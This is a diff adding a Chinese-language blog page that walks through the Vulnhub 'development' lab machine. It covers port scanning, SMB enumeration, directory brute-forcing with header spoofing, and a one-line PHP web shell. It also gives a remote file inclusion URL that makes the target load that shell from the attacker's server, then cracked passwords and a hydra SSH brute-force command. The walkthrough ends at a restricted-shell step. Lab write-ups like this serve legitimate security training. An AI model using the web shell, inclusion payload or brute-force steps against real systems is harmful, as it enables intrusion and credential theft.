@@ -1,0 +1,1440 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/head.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Achernar">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="development靶机IP：192.168.11.148   信息收集：  12#快速扫描一下扫描tcp端口nmap -sT 192.168.11.148 --min-rate&#x3D;1000  -p- -T4             12345678#对开发的tcp端口详细扫描nmap -A 192.168.11.148 -p 22,113,139,445,8080nmap -sV -O -sC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="励志学习第四天之vulnhub-development">
+<meta property="og:url" content="http://example.com/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/index.html">
+<meta property="og:site_name" content="Achernar">
+<meta property="og:description" content="development靶机IP：192.168.11.148   信息收集：  12#快速扫描一下扫描tcp端口nmap -sT 192.168.11.148 --min-rate&#x3D;1000  -p- -T4             12345678#对开发的tcp端口详细扫描nmap -A 192.168.11.148 -p 22,113,139,445,8080nmap -sV -O -sC">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/biaoti.jpg">
+<meta property="article:published_time" content="2025-05-29T09:50:58.000Z">
+<meta property="article:modified_time" content="2025-05-27T12:21:46.713Z">
+<meta property="article:author" content="Achernar">
+<meta property="article:tag" content="原创">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/biaoti.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>励志学习第四天之vulnhub-development - Achernar</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Nlnb8Qk84Y149g92eAYi98fl-gzGzoHsz","app_key":"4Bb0mDjXB8MftPeL9yNfjBgO","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Achernar</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="励志学习第四天之vulnhub-development"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-29 17:50" pubdate>
+          2025年5月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">励志学习第四天之vulnhub-development</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="development"><a href="#development" class="headerlink" title="development"></a>development</h1><p><strong>靶机IP：192.168.11.148</strong></p>
+<br/>
+
+<h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a><strong>信息收集：</strong></h2><br/>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">快速扫描一下扫描tcp端口</span><br>nmap -sT 192.168.11.148 --min-rate=1000  -p- -T4 <br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/1.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">对开发的tcp端口详细扫描</span><br><br>nmap -A 192.168.11.148 -p 22,113,139,445,8080<br><br>nmap -sV -O -sC -sT 192.168.11.148 -p 22,113,139,445,8080<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">（-A 并配合root权限，能实现更高效的扫描（SYN扫描）和更全面的信息收集（如路由路径）</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">（若目标网络存在严格过滤，-A 默认的SYN扫描比 -sT 更容易绕过基础防护）</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/2.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/3.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<h2 id="外围打点："><a href="#外围打点：" class="headerlink" title="外围打点："></a><strong>外围打点：</strong></h2><p>开放了smb服务，直接怼（enum4linux）扫一波</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">基本用法</span><br>enum4linux -a 目标IP 			（全面扫描，推荐使用）<br>enum4linux -U 目标IP			（提取用户名如administrator、guest等）<br>enum4linux -S 目标IP			（显示print$、ADMIN$等默认共享及自定义共享）<br>enum4linux -P 目标IP			（获取最小密码长度、过期时间等）<br>enum4linux -o 目标IP			（识别系统版本，如Samba 3.x或Windows Server版本）<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">1. 基础信息</span><br>目标IP: 192.168.11.148<br>主机名: DEVELOPMENT<br>工作组: WORKGROUP（非域环境，可能为对等网络）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">2. 服务与系统信息</span><br>Samba版本: Ubuntu上的Samba服务器（具体版本未明确，但OS版本标记为6.1）。<br>开放服务:<br>文件共享服务（File Server Service）<br>打印机驱动共享（print$）<br>自定义共享目录（access，权限拒绝访问）<br>IPC管道（IPC$）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">3. 用户与权限</span><br>发现用户:<br>intern (RID: 1000，账户状态正常)<br>匿名访问:<br>允许空用户名/空密码会话（可能存在安全风险）。<br>共享权限:<br><span class="hljs-meta prompt_">print$ </span><span class="language-bash">和 access 共享目录均拒绝匿名访问（Mapping: DENIED）。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">4. 密码策略</span><br>最小密码长度: 5字符<br>密码复杂度: 禁用<br>密码历史: 无限制<br>账户锁定策略: 无锁定阈值（可无限次尝试登录）<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">5. 潜在攻击面</span><br>弱密码风险: 用户 intern 可能使用简单密码（因密码复杂度禁用）。<br>共享目录利用: 若获取有效凭据，可访问 access 共享。<br>Samba漏洞: 需进一步确认Ubuntu/Samba版本以查找已知漏洞（如CVE-2017-7494等）。<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">6. 后续渗透建议</span><br>暴力破解:<br>针对用户 intern 使用工具（如 hydra）爆破SMB服务。<br>密码字典需包含长度≥5的弱密码（如 intern123, password）。<br>Samba版本探测:<br>使用 smbclient -L //192.168.11.148 或 nmap --script smb-vuln* 检测漏洞。<br>共享目录深入:<br>若获取凭据，尝试访问 access 共享：<br>smbclient //192.168.11.148/access -U intern<br>匿名IPC探查:<br>通过 rpcclient -U &quot;&quot; -N 192.168.11.148 尝试枚举更多信息。<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>访问8080端口看看：</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/4.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>扫目录：</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/5.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<ul>
+<li>（芜湖，好像会封我）</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">（减小线程，加延迟，随机ua头和本机扫描看看）</span><br>python dirsearch.py -u http://192.168.11.148:8080 -t 10 --delay=500 -H &quot;X-Forwarded-For:127.0.0.1&quot; --random-agent <br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/6.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<ul>
+<li>还是不行，有点意思</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>回到首页仔细看看有什么吧</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/7.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li>说了有很多文件，那就去看看吧</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/8.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<p><strong>还真挺多目录的，一个一个看看吧</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>访问后，以几个重点截图，注意，要查看页面源代码才能发现的</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<p><br/>pment.html访问给出一个目录&#96;.&#x2F;developmentsecretpage**</p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/9.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>在downloads.html目录给出一个文件<code>test.pacp</code>，格式来看像是数据流量包</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/10.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>访问<code>./developmentsecretpage</code></strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/11.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>给出一个<code>patrick.php</code>文件，点击访问，确实可解析<code>php</code>文件，并且有一个<code>sitemap.php</code>文件及链接</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/12.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>访问<code>sitemap.php</code>，给出两个<code>php</code>文件，<code>securitynotice.php</code>和<code>directortestpagev1.php</code></strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/13.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>访问<code>securitynotice.php</code>，给出了设置密码的情况，可能以<code>P@ssw0rd</code>加数字为设置</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/14.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>访问<code>directortestpagev1.php</code>，给出一个<code>test.html</code>的界面</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/15.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>这个<code>test.html</code>与前面给出的是一样的，那么访问前面<code>test.pcap</code>这个文件，该文件直接下载到本地，然后使用科来或</strong></p>
+<p><strong>者<code>wireshark</code>工具进行打开，即可看到产生的网络数据包</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>使用<code>wireshark</code>打开观察一下</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/16.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>ok，首先观察大概两个协议为主<code>http</code>和<code>smb</code>，那么先访问之前并未有的一个链接<code>/qinyi/motivation.html</code>，</strong></p>
+<p><strong>啧，没有东西</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>继续分析<code>smb</code>协议的数据，但是并未发现敏感数据，只有一个路径<code>/DEVELOPMENT/IPC$</code>和版本等信息，但是不知</strong></p>
+<p><strong>道用户名等</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/17.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>估计是实力不够，我是没从这个数据包发现到了东西</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>继续回到网站漏洞寻找吧</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>继续从网站下手，之前还有一个链接未点击测试</strong></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.11.148:8080/developmentsecretpage/directortestpagev1.php?logout=1">http://192.168.11.148:8080/developmentsecretpage/directortestpagev1.php?logout=1</a></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p>点击后，发现一个登录框，啧，这奇怪，访问时直接登录，这里难道出问题？</p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/18.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<p><strong>直接就进去了，好像有点意思</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>虽然前面给出了密码的可能性策略，这里先随便在登录框输入，还是进去了，比刚刚多了一些报错</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/20.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>有一个<code>slogin_lib.inc.php</code>文件，实力不够，不懂啥用处，访问了也是个空白页</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/21.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>不管了，去先搜索一下，看是否是官方的函数，有没有什么用处</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>不搜不知道，一搜漏洞百出啊，我靠，直接在谷歌漏洞数据库找了两个exp</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/22.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">第一个是远程文件包含<br><br>第二个是敏感文件的位置<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><br/><strong>那我们就一个一个试试个，先来看看第一个</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>漏洞利用：</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>第一个漏洞：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">因为是个远程文件包含，那我们创建一个php脚本测试，然后在kali开启一个http服务</span><br><br>&lt;?php if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&#x27;cmd&#x27;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; &#125;?&gt;<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>直接访问</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://192.168.11.148:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.11.128:8000/shell.php<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>执行后，kali这边的http服务并没有收到请求，所以，这个远程代码执行的漏洞，可能不存在也可能是被过滤了</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/23.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>再看看第二个漏洞吧：</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/24.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<ul>
+<li><strong>好像有货，这么多账号密码，这密码一眼就是md5加密，过去解密一下</strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>这里使用网站解吧，比较快，能不能搞出来就看命了</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">admin</th>
+<th align="center">未破解出来</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">intern</td>
+<td align="center">12345678900987654321</td>
+</tr>
+<tr>
+<td align="center">patrick</td>
+<td align="center">P@ssw0rd25</td>
+</tr>
+<tr>
+<td align="center">qiu</td>
+<td align="center">qiu</td>
+</tr>
+</tbody></table>
+<br/>
+
+<br/>
+
+
+
+<p><strong>那这边拿到三个账号密码，回去登录框登录肯定不对了，那都不用就进去了，那么测试ssh登录</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<ul>
+<li><strong>将三个用户名存储在<code>user</code>文件，三个密码存储在<code>passwd</code>文件，使用<code>hydra</code>进行爆破</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L user -P passwd ssh://192.168.11.148<br></code></pre></td></tr></table></figure>
+
+
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/25.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a>后渗透：</h2><br/>
+
+<br/>
+
+
+
+<ul>
+<li><strong>连到了，但好像是有rbash</strong></li>
+</ul>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/26.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>看看有哪些可以用的吧</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/27.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<p><strong>再看看是什么限制</strong></p>
